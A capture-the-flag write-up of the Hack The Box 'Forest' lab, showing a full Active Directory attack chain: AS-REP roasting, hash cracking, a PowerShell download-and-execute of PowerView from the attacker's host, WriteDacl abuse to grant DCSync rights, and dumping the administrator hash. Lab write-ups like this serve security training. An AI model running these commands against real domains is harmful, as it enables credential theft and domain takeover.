---
title: 'HTB Forest - Easy'
date: 2024-05-09 16:00:00 +0000
categories: [HTB Machines]
tags: [Easy, Windows, HTB]
---

**Forest** is an easy HTB machine that starts with an **AS-REP roasting attack** against a member of a high-privileged group. This group, named ‘Account Operators’, has **GenericAll permissions** over another group that is **permitted to create any ACE** on the domain object by **exploiting WriteDacl**. Privilege escalation to Domain Admins is achievable by **granting ourselves DC Sync rights** and dumping the administrator hash.

<img src="/assets/img/forest/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.95.210

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.95.210 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49671, 49680, 49681, 49686, 49709

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.95.210 -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49686,49709

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 17:28 WEST
Nmap scan report for 10.129.95.210
Host is up (0.063s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-05-09 16:36:14Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49709/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-09T16:37:06
|_  start_date: 2024-05-09T16:33:19
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h27m02s, deviation: 4h02m30s, median: 7m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-05-09T09:37:04-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.62 seconds

[+] Script finished successfully
```

Appended the newly discovered hostname and domain to /etc/hosts.

```bash
echo -e "10.129.95.210\thtb.local FOREST.htb.local" | sudo tee -a /etc/hosts
10.129.95.210   htb.local FOREST.htb.local
```

**LDAP anonymous bind** is enabled, meaning that we can enumerate the domain via LDAP queries.

```
ldapsearch -x -H ldap://10.129.95.210 -b 'DC=htb,DC=local' "(ObjectClass=user)" | grep -i samaccountname 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
...
```

# Exploitation

Trying common AD attacks reveals a user called ‘svc-alfresco’ that is vulnerable to **AS-REP roasting**.

```
impacket-GetNPUsers htb.local/ -request -dc-ip 10.129.95.210
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-05-09 17:45:45.597784  2019-09-23 12:09:47.931194  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:46f8adfb35eb30...
```

It was a weak password so we could crack it.

```
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:46f8adfb35eb30...:<REDACTED>
```

NetExec confirms that the credentials are valid.

```
netexec smb 10.129.95.210 -u svc-alfresco -p <REDACTED> --shares
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:<REDACTED> 
SMB         10.129.95.210   445    FOREST           [*] Enumerated shares
SMB         10.129.95.210   445    FOREST           Share           Permissions     Remark
SMB         10.129.95.210   445    FOREST           -----           -----------     ------
SMB         10.129.95.210   445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.95.210   445    FOREST           C$                              Default share
SMB         10.129.95.210   445    FOREST           IPC$                            Remote IPC
SMB         10.129.95.210   445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.95.210   445    FOREST           SYSVOL          READ            Logon server share
```

Svc-alfresco also has PS Remote access into the Domain Controller.

```
netexec winrm 10.129.95.210 -u svc-alfresco -p <REDACTED>
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:<REDACTED> (Pwn3d!)
```

Connected over WinRM and read the user flag.

```
evil-winrm -u svc-alfresco -p <REDACTED> -i 10.129.95.210

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> hostname
FOREST

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type c:\users\svc-alfresco\desktop\user.txt
59cca37192e24634****************
```

# PrivEsc

Executed [bloodhound-python](https://github.com/dirkjanm/BloodHound.py) to enumerate the domain.

```bash
bloodhound-python -u svc-alfresco -p <REDACTED> -ns 10.129.95.210 -d htb.local -c all
```

Svc-alfresco is a member of the ‘Account Operators’ group.

<img src="/assets/img/forest/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

And this group has GenericAll permissions over the ‘Exchange Windows Permissions’ group, which is **allowed to create any ACE over the HTB.LOCAL object** **abusing WriteDacl**.

<img src="/assets/img/forest/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

We will add ourselves to the privileged group and grant us with DCSync rights over the domain.

```powershell
(new-object system.net.webclient).downloadstring("http://10.10.14.112/powerview.ps1")|iex

add-domaingroupmember -identity "Exchange Windows Permissions" -members "svc-alfresco"

$securepassword = convertto-securestring "<REDACTED>" -asplaintext -force
$credential = new-object system.management.automation.pscredential('htb\svc-alfresco', $securepassword)
add-domainobjectacl -credential $credential -targetidentity "DC=HTB,DC=LOCAL" -principalidentity 'htb\svc-alfresco' -rights DCSync
```

Then, we can dump the administrator hash by a replication attack.

```
impacket-secretsdump htb.local/svc-alfresco:<REDACTED>@FOREST.htb.local -just-dc-user administrator -dc-ip 10.129.95.210
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:<REDACTED>:::
```

With the administrator hash it is possible to connect over WinRM and read the root flag. GGs!

```
evil-winrm -u administrator -H <REDACTED> -i FOREST.htb.local

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
FOREST

*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\users\administrator\desktop\root.txt
3dd58b034309fb94****************
```

Note: We could also use PsExec to get a shell as SYSTEM.